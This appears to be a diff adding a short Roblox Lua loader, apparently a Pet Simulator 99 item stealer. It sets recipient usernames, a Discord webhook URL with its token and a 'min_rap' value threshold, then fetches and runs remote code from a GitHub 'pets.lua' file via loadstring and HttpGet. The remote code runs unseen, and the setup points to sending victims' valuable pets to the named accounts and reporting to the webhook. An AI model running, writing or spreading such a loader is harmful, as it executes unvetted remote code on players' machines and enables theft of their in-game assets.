@@ -1,0 +1,7 @@
+Username = "IcatchEXpokemoh"
+Username2 = "IcatchEXpokemon"
+Webhook = "https://discord.com/api/webhooks/1229903385512378509/cVc1mS3DaGtXJqKRwel6MzTqQjeYN32Io49MyQ24KSpTqTo401CXtu6peEJ8Q2tP1e6A"
+Support = false
+min_rap = 50000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
